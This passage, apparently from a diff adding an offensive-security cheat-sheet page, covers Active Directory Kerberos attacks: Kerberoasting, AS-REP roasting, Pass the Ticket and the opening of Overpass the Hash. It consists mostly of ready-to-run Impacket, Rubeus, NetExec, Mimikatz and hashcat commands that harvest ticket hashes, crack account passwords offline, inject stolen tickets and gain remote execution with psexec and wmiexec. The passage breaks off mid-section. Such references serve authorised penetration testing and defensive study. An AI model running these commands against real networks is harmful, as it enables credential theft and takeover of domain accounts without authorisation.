+</span><span id="__span-0-12"><a id="__codelineno-0-12" name="__codelineno-0-12" href="#__codelineno-0-12"></a><span class="nb">export</span><span class="w"> </span><span class="nv">DOMAIN_SID</span><span class="o">=</span><span class="s1">&#39;S-1-5-21-1111111111-2222222222-3333333333&#39;</span>
+</span></code></pre></div>
+<hr />
+<h2 id="kerberoasting">Kerberoasting</h2>
+<p>Kerberoasting targets accounts with Service Principal Names.</p>
+<p>A domain user can request a Kerberos service ticket for an SPN. If the SPN belongs to a user account, the returned ticket contains material encrypted with a key derived from that service account's password. The ticket can then be cracked offline.</p>
+<p>Requirements:</p>
+<table>
+<thead>
+<tr>
+<th>Requirement</th>
+<th>Notes</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Valid domain user</td>
+<td>Usually any low-privileged domain account.</td>
+</tr>
+<tr>
+<td>SPN target</td>
+<td>User account with one or more SPNs.</td>
+</tr>
+<tr>
+<td>KDC access</td>
+<td>Port <code>88</code> to domain controller.</td>
+</tr>
+<tr>
+<td>Cracking setup</td>
+<td>Hashcat or John with wordlists/rules.</td>
+</tr>
+</tbody>
+</table>
+<p>Good Kerberoast targets often have:</p>
+<ul>
+<li><code>servicePrincipalName</code> on a user account</li>
+<li>old <code>pwdLastSet</code></li>
+<li>privileged group membership</li>
+<li>service-like account name</li>
+<li>weak or predictable password pattern</li>
+<li>MSSQL, HTTP, custom application, or legacy service SPNs</li>
+</ul>
+<p>Find SPN users with LDAP:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>ldapsearch<span class="w"> </span>-x<span class="w"> </span>-H<span class="w"> </span>ldap://<span class="nv">$DC_IP</span><span class="w"> </span>-D<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$NETBIOS</span><span class="s2">\\</span><span class="nv">$USER</span><span class="s2">&quot;</span><span class="w"> </span>-w<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$PASS</span><span class="s2">&quot;</span><span class="w"> </span><span class="se">\</span>
+</span><span id="__span-1-2"><a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a>-b<span class="w"> </span><span class="s2">&quot;DC=corp,DC=local&quot;</span><span class="w"> </span><span class="s2">&quot;(&amp;(objectCategory=person)(objectClass=user)(servicePrincipalName=*))&quot;</span><span class="w"> </span><span class="se">\</span>
+</span><span id="__span-1-3"><a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a>sAMAccountName<span class="w"> </span>servicePrincipalName<span class="w"> </span>memberOf<span class="w"> </span>pwdLastSet<span class="w"> </span>lastLogonTimestamp
+</span></code></pre></div>
+<p>PowerView:</p>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a><span class="nb">Get-DomainUser</span> <span class="n">-SPN</span>
+</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a><span class="nb">Get-DomainUser</span> <span class="n">-SPN</span> <span class="p">|</span> <span class="nb">Select-Object</span> <span class="n">samaccountname</span><span class="p">,</span><span class="n">serviceprincipalname</span><span class="p">,</span><span class="n">pwdlastset</span><span class="p">,</span><span class="n">memberof</span>
+</span></code></pre></div>
+<p>Impacket:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>GetUserSPNs.py<span class="w"> </span><span class="nv">$DOMAIN</span>/<span class="nv">$USER</span>:<span class="s2">&quot;</span><span class="nv">$PASS</span><span class="s2">&quot;</span><span class="w"> </span>-dc-ip<span class="w"> </span><span class="nv">$DC_IP</span><span class="w"> </span>-request
+</span></code></pre></div>
+<p>Save hashes:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>GetUserSPNs.py<span class="w"> </span><span class="nv">$DOMAIN</span>/<span class="nv">$USER</span>:<span class="s2">&quot;</span><span class="nv">$PASS</span><span class="s2">&quot;</span><span class="w"> </span>-dc-ip<span class="w"> </span><span class="nv">$DC_IP</span><span class="w"> </span>-request<span class="w"> </span>-outputfile<span class="w"> </span>kerberoast_hashes.txt
+</span></code></pre></div>
+<p>With NT hash:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a>GetUserSPNs.py<span class="w"> </span><span class="nv">$DOMAIN</span>/<span class="nv">$USER</span><span class="w"> </span>-hashes<span class="w"> </span>:<span class="nv">$NTLM</span><span class="w"> </span>-dc-ip<span class="w"> </span><span class="nv">$DC_IP</span><span class="w"> </span>-request<span class="w"> </span>-outputfile<span class="w"> </span>kerberoast_hashes.txt
+</span></code></pre></div>
+<p>Kerberos auth with ccache:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a><span class="nb">export</span><span class="w"> </span><span class="nv">KRB5CCNAME</span><span class="o">=</span><span class="nv">$PWD</span>/<span class="nv">$USER</span>.ccache
+</span><span id="__span-6-2"><a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a>GetUserSPNs.py<span class="w"> </span><span class="nv">$DOMAIN</span>/<span class="nv">$USER</span><span class="w"> </span>-k<span class="w"> </span>-no-pass<span class="w"> </span>-dc-host<span class="w"> </span><span class="nv">$DC_HOST</span><span class="w"> </span>-request<span class="w"> </span>-outputfile<span class="w"> </span>kerberoast_hashes.txt
+</span></code></pre></div>
+<p>NetExec:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a>nxc<span class="w"> </span>ldap<span class="w"> </span><span class="nv">$DC_IP</span><span class="w"> </span>-u<span class="w"> </span><span class="nv">$USER</span><span class="w"> </span>-p<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$PASS</span><span class="s2">&quot;</span><span class="w"> </span>-d<span class="w"> </span><span class="nv">$DOMAIN</span><span class="w"> </span>--kerberoasting<span class="w"> </span>kerberoast_hashes.txt
+</span></code></pre></div>
+<p>Rubeus:</p>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a><span class="n">Rubeus</span><span class="p">.</span><span class="n">exe</span> <span class="n">kerberoast</span>
+</span><span id="__span-8-2"><a id="__codelineno-8-2" name="__codelineno-8-2" href="#__codelineno-8-2"></a><span class="n">Rubeus</span><span class="p">.</span><span class="n">exe</span> <span class="n">kerberoast</span> <span class="p">/</span><span class="n">outfile</span><span class="p">:</span><span class="n">kerberoast_hashes</span><span class="p">.</span><span class="n">txt</span>
+</span><span id="__span-8-3"><a id="__codelineno-8-3" name="__codelineno-8-3" href="#__codelineno-8-3"></a><span class="n">Rubeus</span><span class="p">.</span><span class="n">exe</span> <span class="n">kerberoast</span> <span class="p">/</span><span class="n">user</span><span class="p">:</span><span class="n">svc_sql</span> <span class="p">/</span><span class="n">outfile</span><span class="p">:</span><span class="n">svc_sql_tgs</span><span class="p">.</span><span class="n">txt</span>
+</span><span id="__span-8-4"><a id="__codelineno-8-4" name="__codelineno-8-4" href="#__codelineno-8-4"></a><span class="n">Rubeus</span><span class="p">.</span><span class="n">exe</span> <span class="n">kerberoast</span> <span class="p">/</span><span class="n">spn</span><span class="p">:</span><span class="n">MSSQLSvc</span><span class="p">/</span><span class="n">sql01</span><span class="p">.</span><span class="n">corp</span><span class="p">.</span><span class="k">local:</span><span class="n">1433</span> <span class="p">/</span><span class="n">outfile</span><span class="p">:</span><span class="n">mssql_tgs</span><span class="p">.</span><span class="n">txt</span>
+</span></code></pre></div>
+<p>Crack with Hashcat:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a>hashcat<span class="w"> </span>-m<span class="w"> </span><span class="m">13100</span><span class="w"> </span>kerberoast_hashes.txt<span class="w"> </span>/usr/share/wordlists/rockyou.txt
+</span><span id="__span-9-2"><a id="__codelineno-9-2" name="__codelineno-9-2" href="#__codelineno-9-2"></a>hashcat<span class="w"> </span>-m<span class="w"> </span><span class="m">13100</span><span class="w"> </span>kerberoast_hashes.txt<span class="w"> </span>/usr/share/wordlists/rockyou.txt<span class="w"> </span>-r<span class="w"> </span>rules/best64.rule
+</span><span id="__span-9-3"><a id="__codelineno-9-3" name="__codelineno-9-3" href="#__codelineno-9-3"></a>hashcat<span class="w"> </span>-m<span class="w"> </span><span class="m">13100</span><span class="w"> </span>kerberoast_hashes.txt<span class="w"> </span>--show
+</span></code></pre></div>
+<p>Common Hashcat modes:</p>
+<table>
+<thead>
+<tr>
+<th>Hash type</th>
+<th>Mode</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Kerberos 5 TGS-REP etype 23</td>
+<td><code>13100</code></td>
+</tr>
+<tr>
+<td>Kerberos 5 TGS-REP etype 17</td>
+<td><code>19600</code></td>
+</tr>
+<tr>
+<td>Kerberos 5 TGS-REP etype 18</td>
+<td><code>19700</code></td>
+</tr>
+</tbody>
+</table>
+<p>Crack with John:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a>john<span class="w"> </span>--wordlist<span class="o">=</span>/usr/share/wordlists/rockyou.txt<span class="w"> </span>kerberoast_hashes.txt
+</span><span id="__span-10-2"><a id="__codelineno-10-2" name="__codelineno-10-2" href="#__codelineno-10-2"></a>john<span class="w"> </span>--show<span class="w"> </span>kerberoast_hashes.txt
+</span></code></pre></div>
+<hr />
+<h2 id="asrep-roasting">ASREP Roasting</h2>
+<p>ASREP roasting targets users that do not require Kerberos pre-authentication.</p>
+<p>If pre-authentication is disabled, the KDC can return AS-REP material encrypted with the user's password-derived key. This material can be cracked offline.</p>
+<p>Requirements:</p>
+<table>
+<thead>
+<tr>
+<th>Requirement</th>
+<th>Notes</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Domain name</td>
+<td>Example: <code>corp.local</code>.</td>
+</tr>
+<tr>
+<td>DC IP</td>
+<td>KDC target.</td>
+</tr>
+<tr>
+<td>Username list</td>
+<td>Required for unauthenticated check.</td>
+</tr>
+<tr>
+<td>Kerberos reachable</td>
+<td>Port <code>88</code>.</td>
+</tr>
+<tr>
+<td>DONT_REQ_PREAUTH</td>
+<td>Target account flag.</td>
+</tr>
+</tbody>
+</table>
+<p>Unauthenticated check with Impacket:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a>GetNPUsers.py<span class="w"> </span><span class="nv">$DOMAIN</span>/<span class="w"> </span>-usersfile<span class="w"> </span>users.txt<span class="w"> </span>-dc-ip<span class="w"> </span><span class="nv">$DC_IP</span><span class="w"> </span>-no-pass
+</span></code></pre></div>
+<p>Save hashes:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-12-1"><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a>GetNPUsers.py<span class="w"> </span><span class="nv">$DOMAIN</span>/<span class="w"> </span>-usersfile<span class="w"> </span>users.txt<span class="w"> </span>-dc-ip<span class="w"> </span><span class="nv">$DC_IP</span><span class="w"> </span>-no-pass<span class="w"> </span>-outputfile<span class="w"> </span>asrep_hashes.txt
+</span></code></pre></div>
+<p>Authenticated ASREP roasting:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-13-1"><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a>GetNPUsers.py<span class="w"> </span><span class="nv">$DOMAIN</span>/<span class="nv">$USER</span>:<span class="s2">&quot;</span><span class="nv">$PASS</span><span class="s2">&quot;</span><span class="w"> </span>-dc-ip<span class="w"> </span><span class="nv">$DC_IP</span><span class="w"> </span>-request<span class="w"> </span>-outputfile<span class="w"> </span>asrep_hashes.txt
+</span></code></pre></div>
+<p>With hash:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-14-1"><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a>GetNPUsers.py<span class="w"> </span><span class="nv">$DOMAIN</span>/<span class="nv">$USER</span><span class="w"> </span>-hashes<span class="w"> </span>:<span class="nv">$NTLM</span><span class="w"> </span>-dc-ip<span class="w"> </span><span class="nv">$DC_IP</span><span class="w"> </span>-request<span class="w"> </span>-outputfile<span class="w"> </span>asrep_hashes.txt
+</span></code></pre></div>
+<p>NetExec:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-15-1"><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a>nxc<span class="w"> </span>ldap<span class="w"> </span><span class="nv">$DC_IP</span><span class="w"> </span>-u<span class="w"> </span><span class="nv">$USER</span><span class="w"> </span>-p<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$PASS</span><span class="s2">&quot;</span><span class="w"> </span>-d<span class="w"> </span><span class="nv">$DOMAIN</span><span class="w"> </span>--asreproast<span class="w"> </span>asrep_hashes.txt
+</span></code></pre></div>
+<p>LDAP discovery:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-16-1"><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a>ldapsearch<span class="w"> </span>-x<span class="w"> </span>-H<span class="w"> </span>ldap://<span class="nv">$DC_IP</span><span class="w"> </span>-D<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$NETBIOS</span><span class="s2">\\</span><span class="nv">$USER</span><span class="s2">&quot;</span><span class="w"> </span>-w<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$PASS</span><span class="s2">&quot;</span><span class="w"> </span><span class="se">\</span>
+</span><span id="__span-16-2"><a id="__codelineno-16-2" name="__codelineno-16-2" href="#__codelineno-16-2"></a>-b<span class="w"> </span><span class="s2">&quot;DC=corp,DC=local&quot;</span><span class="w"> </span><span class="s2">&quot;(&amp;(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))&quot;</span><span class="w"> </span><span class="se">\</span>
+</span><span id="__span-16-3"><a id="__codelineno-16-3" name="__codelineno-16-3" href="#__codelineno-16-3"></a>sAMAccountName<span class="w"> </span>userPrincipalName<span class="w"> </span>memberOf<span class="w"> </span>pwdLastSet
+</span></code></pre></div>
+<p>PowerView:</p>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-17-1"><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a><span class="nb">Get-DomainUser</span> <span class="n">-UACFilter</span> <span class="n">DONT_REQ_PREAUTH</span>
+</span></code></pre></div>
+<p>Rubeus:</p>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-18-1"><a id="__codelineno-18-1" name="__codelineno-18-1" href="#__codelineno-18-1"></a><span class="n">Rubeus</span><span class="p">.</span><span class="n">exe</span> <span class="n">asreproast</span>
+</span><span id="__span-18-2"><a id="__codelineno-18-2" name="__codelineno-18-2" href="#__codelineno-18-2"></a><span class="n">Rubeus</span><span class="p">.</span><span class="n">exe</span> <span class="n">asreproast</span> <span class="p">/</span><span class="n">user</span><span class="p">:</span><span class="n">alice</span>
+</span><span id="__span-18-3"><a id="__codelineno-18-3" name="__codelineno-18-3" href="#__codelineno-18-3"></a><span class="n">Rubeus</span><span class="p">.</span><span class="n">exe</span> <span class="n">asreproast</span> <span class="p">/</span><span class="n">outfile</span><span class="p">:</span><span class="n">asrep_hashes</span><span class="p">.</span><span class="n">txt</span>
+</span><span id="__span-18-4"><a id="__codelineno-18-4" name="__codelineno-18-4" href="#__codelineno-18-4"></a><span class="n">Rubeus</span><span class="p">.</span><span class="n">exe</span> <span class="n">asreproast</span> <span class="p">/</span><span class="n">domain</span><span class="p">:</span><span class="n">corp</span><span class="p">.</span><span class="n">local</span> <span class="p">/</span><span class="n">outfile</span><span class="p">:</span><span class="n">asrep_hashes</span><span class="p">.</span><span class="n">txt</span>
+</span></code></pre></div>
+<p>Crack with Hashcat:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-19-1"><a id="__codelineno-19-1" name="__codelineno-19-1" href="#__codelineno-19-1"></a>hashcat<span class="w"> </span>-m<span class="w"> </span><span class="m">18200</span><span class="w"> </span>asrep_hashes.txt<span class="w"> </span>/usr/share/wordlists/rockyou.txt
+</span><span id="__span-19-2"><a id="__codelineno-19-2" name="__codelineno-19-2" href="#__codelineno-19-2"></a>hashcat<span class="w"> </span>-m<span class="w"> </span><span class="m">18200</span><span class="w"> </span>asrep_hashes.txt<span class="w"> </span>--show
+</span></code></pre></div>
+<p>Crack with John:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-20-1"><a id="__codelineno-20-1" name="__codelineno-20-1" href="#__codelineno-20-1"></a>john<span class="w"> </span>--wordlist<span class="o">=</span>/usr/share/wordlists/rockyou.txt<span class="w"> </span>asrep_hashes.txt
+</span><span id="__span-20-2"><a id="__codelineno-20-2" name="__codelineno-20-2" href="#__codelineno-20-2"></a>john<span class="w"> </span>--show<span class="w"> </span>asrep_hashes.txt
+</span></code></pre></div>
+<hr />
+<h2 id="pass-the-ticket">Pass the Ticket</h2>
+<p>Pass the Ticket uses a Kerberos ticket directly instead of a plaintext password or NT hash.</p>
+<p>Common ticket formats:</p>
+<table>
+<thead>
+<tr>
+<th>Format</th>
+<th>Platform / tool</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>.kirbi</code></td>
+<td>Windows Kerberos ticket format.</td>
+</tr>
+<tr>
+<td><code>.ccache</code></td>
+<td>MIT Kerberos cache format, commonly used on Linux.</td>
+</tr>
+</tbody>
+</table>
+<p>Common ticket types:</p>
+<table>
+<thead>
+<tr>
+<th>Ticket</th>
+<th>Meaning</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>TGT</td>
+<td>Ticket Granting Ticket.</td>
+</tr>
+<tr>
+<td>TGS</td>
+<td>Service ticket for a specific SPN.</td>
+</tr>
+</tbody>
+</table>
+<p>List Linux tickets:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-21-1"><a id="__codelineno-21-1" name="__codelineno-21-1" href="#__codelineno-21-1"></a>klist
+</span></code></pre></div>
+<p>Use ccache:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-22-1"><a id="__codelineno-22-1" name="__codelineno-22-1" href="#__codelineno-22-1"></a><span class="nb">export</span><span class="w"> </span><span class="nv">KRB5CCNAME</span><span class="o">=</span><span class="nv">$PWD</span>/alice.ccache
+</span><span id="__span-22-2"><a id="__codelineno-22-2" name="__codelineno-22-2" href="#__codelineno-22-2"></a>klist
+</span></code></pre></div>
+<p>Use Kerberos with Impacket:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-23-1"><a id="__codelineno-23-1" name="__codelineno-23-1" href="#__codelineno-23-1"></a>wmiexec.py<span class="w"> </span>-k<span class="w"> </span>-no-pass<span class="w"> </span><span class="nv">$DOMAIN</span>/<span class="nv">$USER</span>@<span class="nv">$TARGET</span>
+</span><span id="__span-23-2"><a id="__codelineno-23-2" name="__codelineno-23-2" href="#__codelineno-23-2"></a>psexec.py<span class="w"> </span>-k<span class="w"> </span>-no-pass<span class="w"> </span><span class="nv">$DOMAIN</span>/<span class="nv">$USER</span>@<span class="nv">$TARGET</span>
+</span><span id="__span-23-3"><a id="__codelineno-23-3" name="__codelineno-23-3" href="#__codelineno-23-3"></a>smbexec.py<span class="w"> </span>-k<span class="w"> </span>-no-pass<span class="w"> </span><span class="nv">$DOMAIN</span>/<span class="nv">$USER</span>@<span class="nv">$TARGET</span>
+</span><span id="__span-23-4"><a id="__codelineno-23-4" name="__codelineno-23-4" href="#__codelineno-23-4"></a>atexec.py<span class="w"> </span>-k<span class="w"> </span>-no-pass<span class="w"> </span><span class="nv">$DOMAIN</span>/<span class="nv">$USER</span>@<span class="nv">$TARGET</span><span class="w"> </span><span class="s2">&quot;whoami&quot;</span>
+</span></code></pre></div>
+<p>Use Kerberos with NetExec:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-24-1"><a id="__codelineno-24-1" name="__codelineno-24-1" href="#__codelineno-24-1"></a>nxc<span class="w"> </span>smb<span class="w"> </span><span class="nv">$TARGET</span><span class="w"> </span>-k<span class="w"> </span>--use-kcache
+</span><span id="__span-24-2"><a id="__codelineno-24-2" name="__codelineno-24-2" href="#__codelineno-24-2"></a>nxc<span class="w"> </span>ldap<span class="w"> </span><span class="nv">$DC_HOST</span><span class="w"> </span>-k<span class="w"> </span>--use-kcache
+</span><span id="__span-24-3"><a id="__codelineno-24-3" name="__codelineno-24-3" href="#__codelineno-24-3"></a>nxc<span class="w"> </span>winrm<span class="w"> </span><span class="nv">$TARGET</span><span class="w"> </span>-k<span class="w"> </span>--use-kcache
+</span></code></pre></div>
+<p>Request a TGT with known password:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-25-1"><a id="__codelineno-25-1" name="__codelineno-25-1" href="#__codelineno-25-1"></a>getTGT.py<span class="w"> </span><span class="nv">$DOMAIN</span>/<span class="nv">$USER</span>:<span class="s2">&quot;</span><span class="nv">$PASS</span><span class="s2">&quot;</span><span class="w"> </span>-dc-ip<span class="w"> </span><span class="nv">$DC_IP</span>
+</span><span id="__span-25-2"><a id="__codelineno-25-2" name="__codelineno-25-2" href="#__codelineno-25-2"></a><span class="nb">export</span><span class="w"> </span><span class="nv">KRB5CCNAME</span><span class="o">=</span><span class="nv">$PWD</span>/<span class="nv">$USER</span>.ccache
+</span><span id="__span-25-3"><a id="__codelineno-25-3" name="__codelineno-25-3" href="#__codelineno-25-3"></a>klist
+</span></code></pre></div>
+<p>Request a TGT with NT hash:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-26-1"><a id="__codelineno-26-1" name="__codelineno-26-1" href="#__codelineno-26-1"></a>getTGT.py<span class="w"> </span><span class="nv">$DOMAIN</span>/<span class="nv">$USER</span><span class="w"> </span>-hashes<span class="w"> </span>:<span class="nv">$NTLM</span><span class="w"> </span>-dc-ip<span class="w"> </span><span class="nv">$DC_IP</span>
+</span><span id="__span-26-2"><a id="__codelineno-26-2" name="__codelineno-26-2" href="#__codelineno-26-2"></a><span class="nb">export</span><span class="w"> </span><span class="nv">KRB5CCNAME</span><span class="o">=</span><span class="nv">$PWD</span>/<span class="nv">$USER</span>.ccache
+</span></code></pre></div>
+<p>Request a TGT with AES key:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-27-1"><a id="__codelineno-27-1" name="__codelineno-27-1" href="#__codelineno-27-1"></a>getTGT.py<span class="w"> </span><span class="nv">$DOMAIN</span>/<span class="nv">$USER</span><span class="w"> </span>-aesKey<span class="w"> </span><span class="nv">$AES256</span><span class="w"> </span>-dc-ip<span class="w"> </span><span class="nv">$DC_IP</span>
+</span><span id="__span-27-2"><a id="__codelineno-27-2" name="__codelineno-27-2" href="#__codelineno-27-2"></a><span class="nb">export</span><span class="w"> </span><span class="nv">KRB5CCNAME</span><span class="o">=</span><span class="nv">$PWD</span>/<span class="nv">$USER</span>.ccache
+</span></code></pre></div>
+<p>Request a service ticket:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-28-1"><a id="__codelineno-28-1" name="__codelineno-28-1" href="#__codelineno-28-1"></a>getST.py<span class="w"> </span>-spn<span class="w"> </span>cifs/<span class="nv">$TARGET</span><span class="w"> </span><span class="nv">$DOMAIN</span>/<span class="nv">$USER</span>:<span class="s2">&quot;</span><span class="nv">$PASS</span><span class="s2">&quot;</span><span class="w"> </span>-dc-ip<span class="w"> </span><span class="nv">$DC_IP</span>
+</span></code></pre></div>
+<p>Use a ccache ticket:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-29-1"><a id="__codelineno-29-1" name="__codelineno-29-1" href="#__codelineno-29-1"></a><span class="nb">export</span><span class="w"> </span><span class="nv">KRB5CCNAME</span><span class="o">=</span><span class="nv">$PWD</span>/Administrator.ccache
+</span><span id="__span-29-2"><a id="__codelineno-29-2" name="__codelineno-29-2" href="#__codelineno-29-2"></a>klist
+</span><span id="__span-29-3"><a id="__codelineno-29-3" name="__codelineno-29-3" href="#__codelineno-29-3"></a>smbclient.py<span class="w"> </span>-k<span class="w"> </span>-no-pass<span class="w"> </span><span class="nv">$DOMAIN</span>/Administrator@<span class="nv">$TARGET</span>
+</span></code></pre></div>
+<p>Convert tickets:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-30-1"><a id="__codelineno-30-1" name="__codelineno-30-1" href="#__codelineno-30-1"></a>ticketConverter.py<span class="w"> </span>ticket.kirbi<span class="w"> </span>ticket.ccache
+</span><span id="__span-30-2"><a id="__codelineno-30-2" name="__codelineno-30-2" href="#__codelineno-30-2"></a>ticketConverter.py<span class="w"> </span>ticket.ccache<span class="w"> </span>ticket.kirbi
+</span></code></pre></div>
+<p>Windows list tickets:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-31-1"><a id="__codelineno-31-1" name="__codelineno-31-1" href="#__codelineno-31-1"></a>klist
+</span></code></pre></div>
+<p>Rubeus triage:</p>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-32-1"><a id="__codelineno-32-1" name="__codelineno-32-1" href="#__codelineno-32-1"></a><span class="n">Rubeus</span><span class="p">.</span><span class="n">exe</span> <span class="n">triage</span>
+</span><span id="__span-32-2"><a id="__codelineno-32-2" name="__codelineno-32-2" href="#__codelineno-32-2"></a><span class="n">Rubeus</span><span class="p">.</span><span class="n">exe</span> <span class="n">klist</span>
+</span></code></pre></div>
+<p>Rubeus Pass the Ticket:</p>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-33-1"><a id="__codelineno-33-1" name="__codelineno-33-1" href="#__codelineno-33-1"></a><span class="n">Rubeus</span><span class="p">.</span><span class="n">exe</span> <span class="n">ptt</span> <span class="p">/</span><span class="n">ticket</span><span class="p">:</span><span class="n">ticket</span><span class="p">.</span><span class="n">kirbi</span>
+</span><span id="__span-33-2"><a id="__codelineno-33-2" name="__codelineno-33-2" href="#__codelineno-33-2"></a><span class="n">klist</span>
+</span></code></pre></div>
+<p>Base64 ticket:</p>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-34-1"><a id="__codelineno-34-1" name="__codelineno-34-1" href="#__codelineno-34-1"></a><span class="n">Rubeus</span><span class="p">.</span><span class="n">exe</span> <span class="n">ptt</span> <span class="p">/</span><span class="n">ticket</span><span class="p">:</span><span class="n">BASE64_TICKET</span>
+</span></code></pre></div>
+<p>Mimikatz:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-35-1"><a id="__codelineno-35-1" name="__codelineno-35-1" href="#__codelineno-35-1"></a>mimikatz.exe
+</span><span id="__span-35-2"><a id="__codelineno-35-2" name="__codelineno-35-2" href="#__codelineno-35-2"></a>kerberos::list
+</span><span id="__span-35-3"><a id="__codelineno-35-3" name="__codelineno-35-3" href="#__codelineno-35-3"></a>kerberos::ptt ticket.kirbi
+</span></code></pre></div>
+<p>Purge tickets:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-36-1"><a id="__codelineno-36-1" name="__codelineno-36-1" href="#__codelineno-36-1"></a>klist purge
+</span></code></pre></div>
+<p>Rubeus purge:</p>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-37-1"><a id="__codelineno-37-1" name="__codelineno-37-1" href="#__codelineno-37-1"></a><span class="n">Rubeus</span><span class="p">.</span><span class="n">exe</span> <span class="n">purge</span>
+</span></code></pre></div>
+<hr />
+<h2 id="overpass-the-hash">Overpass the Hash</h2>
+<p>Overpass the Hash uses an NT hash or AES key to obtain a Kerberos TGT.</p>
+<p>It is different from Pass the Hash. Pass the Hash uses NTLM authentication directly. Overpass the Hash uses the hash or key to ask Kerberos for a TGT, then uses Kerberos tickets.</p>
+<p>Requirements:</p>
+<table>
+<thead>
+<tr>
+<th>Requirement</th>
+<th>Notes</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>NT hash or AES key</td>
+<td>Account key material.</td>
+</tr>
+<tr>
+<td>Domain name</td>
+<td>Kerberos realm context.</td>
+</tr>
+<tr>
+<td>DC IP or hostname</td>
+<td>KDC target.</td>
+</tr>
+<tr>
+<td>Kerberos reachable</td>
+<td>Port <code>88</code>.</td>
+</tr>
+</tbody>
+</table>
+<p>Linux with Impacket NT hash:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-38-1"><a id="__codelineno-38-1" name="__codelineno-38-1" href="#__codelineno-38-1"></a>getTGT.py<span class="w"> </span><span class="nv">$DOMAIN</span>/<span class="nv">$USER</span><span class="w"> </span>-hashes<span class="w"> </span>:<span class="nv">$NTLM</span><span class="w"> </span>-dc-ip<span class="w"> </span><span class="nv">$DC_IP</span>
+</span><span id="__span-38-2"><a id="__codelineno-38-2" name="__codelineno-38-2" href="#__codelineno-38-2"></a><span class="nb">export</span><span class="w"> </span><span class="nv">KRB5CCNAME</span><span class="o">=</span><span class="nv">$PWD</span>/<span class="nv">$USER</span>.ccache
+</span><span id="__span-38-3"><a id="__codelineno-38-3" name="__codelineno-38-3" href="#__codelineno-38-3"></a>klist
+</span></code></pre></div>
+<p>Linux with AES key:</p>
